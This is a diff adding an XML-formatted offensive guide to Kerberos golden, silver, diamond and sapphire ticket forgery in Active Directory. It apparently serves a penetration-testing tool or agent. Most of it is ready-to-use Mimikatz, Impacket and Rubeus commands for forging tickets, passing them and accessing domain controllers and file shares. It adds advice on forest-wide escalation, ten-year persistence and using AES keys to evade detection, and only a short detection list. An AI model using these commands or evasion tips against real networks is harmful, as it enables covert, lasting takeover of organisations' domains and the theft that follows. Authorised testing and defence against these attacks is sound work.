@@ -1,0 +1,103 @@
+<vulnerability_guide>
+  <title>GOLDEN AND SILVER TICKET ATTACKS</title>
+
+  <critical>Kerberos ticket forgery attacks allow attackers with domain admin or service account credentials to create persistent, virtually undetectable access to Active Directory environments. Golden tickets grant domain-wide access, while silver tickets target specific services.</critical>
+
+  <scope>
+    - Golden ticket creation and usage
+    - Silver ticket attacks against services
+    - Diamond ticket attacks (newer technique)
+    - Detection and persistence considerations
+    - Ticket lifecycle and renewal
+  </scope>
+
+  <methodology>
+    1. PREREQUISITE GATHERING
+       - For Golden Ticket: Obtain krbtgt NTLM hash (requires domain admin)
+       - For Silver Ticket: Obtain service account NTLM hash
+       - Gather domain SID
+       - Identify target user to impersonate
+
+    2. GOLDEN TICKET CREATION
+       {% raw %}
+       # Using Mimikatz
+       mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /id:500 /ptt
+
+       # Using Impacket
+       ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local Administrator
+
+       # Using Rubeus
+       Rubeus.exe golden /rc4:<krbtgt_hash> /user:Administrator /domain:domain.local /sid:S-1-5-21-... /ptt
+       {% endraw %}
+
+    3. SILVER TICKET CREATION
+       {% raw %}
+       # Target specific service (e.g., CIFS for file shares)
+       mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:<service_hash> /ptt
+
+       # Using Impacket for SQL Server
+       ticketer.py -nthash <sql_svc_hash> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/sql.domain.local:1433 Administrator
+       {% endraw %}
+
+    4. TICKET USAGE
+       {% raw %}
+       # Pass the ticket
+       export KRB5CCNAME=/path/to/ticket.ccache
+
+       # Access resources
+       psexec.py -k -no-pass domain.local/Administrator@dc01.domain.local
+       smbclient.py -k -no-pass //server.domain.local/C$
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <diamond_ticket>
+      Modifies legitimate TGT instead of forging from scratch - harder to detect
+      {% raw %}
+      Rubeus.exe diamond /krbkey:<aes256_key> /user:user /password:pass /enctype:aes /domain:domain.local /dc:dc01.domain.local /ptt
+      {% endraw %}
+    </diamond_ticket>
+
+    <sapphire_ticket>
+      Uses S4U2Self to obtain legitimate PAC - evades PAC validation
+      Requires control of a computer account
+    </sapphire_ticket>
+
+    <inter_realm_golden>
+      Golden ticket with Enterprise Admin SID for forest-wide access
+      Add Enterprise Admins SID: S-1-5-21-<root_domain_sid>-519
+    </inter_realm_golden>
+
+    <persistence>
+      - Golden tickets valid for 10 years by default
+      - Survives password resets (except krbtgt reset)
+      - No logon events generated for ticket creation
+      - Consider krbtgt key rotation schedule
+    </persistence>
+  </advanced_techniques>
+
+  <detection>
+    - Event ID 4769 with encryption type 0x17 (RC4) when AES is expected
+    - TGS requests without prior TGT request (AS-REQ)
+    - Tickets with abnormally long lifetimes
+    - User accounts accessing resources they don't normally access
+    - Silver tickets: Service tickets without corresponding TGT
+  </detection>
+
+  <validation>
+    - Successfully access domain controller with forged ticket
+    - Verify ticket works across multiple domain resources
+    - Confirm ticket survives password changes (golden)
+    - Test persistence after system reboots
+  </validation>
+
+  <pro_tips>
+    - Use AES256 keys instead of RC4 to avoid detection
+    - Match ticket encryption to domain policy
+    - Set realistic ticket lifetimes
+    - Golden ticket requires krbtgt hash; silver only needs service hash
+    - Reset krbtgt twice to invalidate golden tickets (wait for replication)
+  </pro_tips>
+
+  <remember>Golden tickets are the "keys to the kingdom" - they provide persistent domain access until krbtgt is reset twice. Silver tickets are stealthier but limited to specific services. Always use AES keys when available to avoid RC4 detection signatures.</remember>
+</vulnerability_guide>
